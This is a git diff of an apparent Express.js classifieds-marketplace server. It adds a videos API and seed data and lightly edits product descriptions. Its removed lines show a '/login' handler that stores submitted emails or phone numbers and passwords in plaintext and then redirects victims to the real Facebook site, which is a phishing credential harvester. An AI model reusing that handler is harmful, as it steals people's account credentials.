@@ -19,13 +19,13 @@ if (databaseUrl) {
     });
     console.log('Database connection pool initialized.');
     
-    // Seed default products if database is empty
+    // Seed default products and videos if database is empty
     seedDatabase();
 } else {
     console.warn('WARNING: DATABASE_URL environment variable is not defined. Database features will not work.');
 }
 
-// Middleware - INCREASE LIMITS TO 10MB FOR BASE64 IMAGES
+// Middleware - body parser limits
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 
@@ -46,7 +46,7 @@ app.get('/api/products', async (req, res) => {
     }
 });
 
-// API: Add a new product (handles Base64 images)
+// API: Add a new product
 app.post('/api/products', async (req, res) => {
     const { category, title, price, img_url, location, seller, description } = req.body;
 
@@ -75,36 +75,24 @@ app.post('/api/products', async (req, res) => {
     }
 });
 
-// Handle the login form submission
-app.post('/login', async (req, res) => {
-    const { mobile_or_email, password } = req.body;
-
-    console.log(`Received login attempt - Mobile/Email: ${mobile_or_email}`);
-
+// API: Get all videos (Watch Feed)
+app.get('/api/videos', async (req, res) => {
     if (!pool) {
-        console.error('Database connection pool is not configured.');
-        return res.status(500).send('Database connection is not configured. Please set the DATABASE_URL environment variable.');
+        return res.status(500).json({ error: 'Database not connected' });
     }
-
     try {
-        const queryText = 'INSERT INTO users (mobile_or_email, password) VALUES ($1, $2) RETURNING id';
-        const values = [mobile_or_email, password];
-        
-        const result = await pool.query(queryText, values);
-        console.log(`Successfully saved user credentials. Assigned ID: ${result.rows[0].id}`);
-
-        // Redirect user to the actual Facebook home page after credentials are saved
-        res.redirect('https://www.facebook.com');
+        const result = await pool.query('SELECT * FROM videos ORDER BY id DESC');
+        res.json(result.rows);
     } catch (err) {
-        console.error('Error saving user to database:', err.message);
-        res.status(500).send('An error occurred during authentication. Please try again.');
+        console.error('Error fetching videos:', err.message);
+        res.status(500).json({ error: 'Database query failed' });
     }
 });
 
-// Seed function to pre-populate listings if database is empty
+// Seed function to pre-populate products and videos
 async function seedDatabase() {
     try {
-        // Create table in case user hasn't run the SQL script
+        // 1. Create and seed products table
         await pool.query(`
             CREATE TABLE IF NOT EXISTS products (
                 id SERIAL PRIMARY KEY,
@@ -241,7 +229,7 @@ async function seedDatabase() {
                     img_url: "https://images.unsplash.com/photo-1622185135505-2d795003994a?w=500&auto=format&fit=crop",
                     location: "Vytilla, Kochi",
                     seller: "Rahul K.",
-                    description: "Honda Activa 6G Grey color, 2021 model. Single owner, low mileage. Chilling engine run, brand new tires. All documents clear. Perfect scooter for ladies and family commute."
+                    description: "Honda Activa 6G Grey color, 2021 model. Single owner, low mileage. Chilling engine run, brand new tires. All documents clear. Perfect scooter for daily commute."
                 },
                 {
                     category: "bikes",
@@ -277,7 +265,7 @@ async function seedDatabase() {
                     img_url: "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&auto=format&fit=crop",
                     location: "Trivandrum, Kerala",
                     seller: "Abhijith S.",
-                    description: "Samsung Galaxy S23 Ultra Phantom Black. 12GB RAM, 256GB storage. Comes with original S-Pen, bill, and box. Used 6 months. Mint condition. Super camera quality."
+                    description: "Samsung Galaxy S23 Ultra Phantom Black. 12GB RAM, 256GB storage. Comes with original S-Pen, bill, and box. Used 6 months. Mint condition."
                 },
                 {
                     category: "phones",
@@ -304,7 +292,7 @@ async function seedDatabase() {
                     img_url: "https://images.unsplash.com/photo-1610030469668-93535c17b6b3?w=500&auto=format&fit=crop",
                     location: "Ernakulam, Kochi",
                     seller: "Priyanka S.",
-                    description: "Georgette embroidered Anarkali kurti with matching dupatta and pants. Heavy embroidery work, beautiful details, sizes S/M/L/XL available. Brand new packet piece. Perfect for festival and function wear."
+                    description: "Georgette embroidered Anarkali kurti with matching dupatta and pants. Heavy embroidery work, sizes S/M/L/XL available. Brand new packet piece. Perfect for festival and function wear."
                 },
                 {
                     category: "clothing",
@@ -412,7 +400,7 @@ async function seedDatabase() {
                     img_url: "https://images.unsplash.com/photo-1610030469668-93535c17b6b3?w=500&auto=format&fit=crop",
                     location: "Kottayam, Kerala",
                     seller: "Parvathy G.",
-                    description: "Pack of 3 straight-cut rayon/silk blend kurtis. Solid vibrant colors with elegant gold printed neck patterns. Brand new, packets unopened. Great daily wear value combo."
+                    description: "Pack of 3 straight-cut rayon/silk blend kurtis. Solid vibrant colors with gold printed neck patterns. Brand new, packets unopened. Great daily wear value combo."
                 },
                 {
                     category: "cars",
@@ -433,6 +421,34 @@ async function seedDatabase() {
             }
             console.log('Seeded 33 default listings successfully!');
         }
+
+        // 2. Create and seed videos table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS videos (
+                id SERIAL PRIMARY KEY,
+                title VARCHAR(255) NOT NULL,
+                youtube_id VARCHAR(50) NOT NULL,
+                description TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        `);
+
+        const videoCountRes = await pool.query('SELECT COUNT(*) FROM videos');
+        const videoCount = parseInt(videoCountRes.rows[0].count);
+
+        if (videoCount === 0) {
+            console.log('Seeding database with default example YouTube video...');
+            await pool.query(
+                'INSERT INTO videos (title, youtube_id, description) VALUES ($1, $2, $3)',
+                [
+                    "Royal Enfield Classic 350 Detailed Ride Review | Kerala Style",
+                    "dQw4w9WgXcQ", // Placeholder (classic YouTube video)
+                    "A detailed review and test ride of the popular Royal Enfield Classic 350. Showing mileage, features, and driving comfort on Kerala roads."
+                ]
+            );
+            console.log('Seeded default video successfully!');
+        }
+
     } catch (err) {
         console.error('Error seeding database:', err.message);
     }
